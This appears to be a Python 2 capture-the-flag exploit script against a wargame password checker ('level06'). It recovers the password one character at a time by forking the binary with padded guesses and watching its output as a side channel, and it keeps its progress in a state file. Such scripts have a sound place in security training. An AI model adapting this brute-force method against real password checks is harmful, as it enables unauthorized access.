# while true; do nice -n 20 python exploitlevel6-avg.py; done
import os
import pickle

num_forks = 0

def test(guess):
    global num_forks
    r, w = os.pipe()
    while 1:
        try:
            child = os.fork()
            num_forks = num_forks + 1
            if child == 0: # in child
                os.dup2(w, 1)
                os.dup2(w, 2)
                os.close(r)
                os.execve("./level06", ["foo", "passwd", guess], {})
                # os.execve("/levels/level06", ["fo", "/home/the-flag/.password", guess], {})
                # print "fail"
                os._exit(1)
            break
        except OSError:
            print "cannot fork. waiting. forks: ", num_forks
            os._exit(0)
    os.close(w)
    inp = os.fdopen(r, "r", 0)
    data = inp.read(100)
    os.kill(child, 9)
    return data

CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
print len(CHARS)

# ~ MAX_ARG_STRLEN
big = "-" * (2**17 - 300)

OUTPUT_PREFIX = "Welcome to the password checker!\n"

def write_state(openset):
    out = file("state", "wb")
    pickle.dump(openset, out)
    out.close()

def read_state():
    try:
        inp = file("state", "rb")
    except:
        print "no state. restrting"
        return set(CHARS)
    return pickle.load(inp)

def bruteforce():
    openset = read_state()
    print "openset", openset

    while len(openset) > 1:
        print len(openset), "prefixes remaining"
        for prefix in list(openset):
            guess = prefix + big
            for i in xrange(10):
                result = test(guess)[len(OUTPUT_PREFIX):]
                try:
                    found_dots = result.index('H')
                    extra_skip = found_dots - len(prefix)
                    print prefix, repr(result), '->', extra_skip
                    if extra_skip == 0:
                        print "not a possible prefix"
                        # found early Haha. tested password 
                        # cannot be correct, since taunt was
                        # called so early
                        openset.remove(prefix)
                        write_state(openset)
                        break
                except ValueError:
                    # no Haha in output
                    pass
    correct_prefix = openset.pop()
    openset = set(correct_prefix + char for char in CHARS)
    print "created new openset"
    write_state(openset)

print bruteforce()

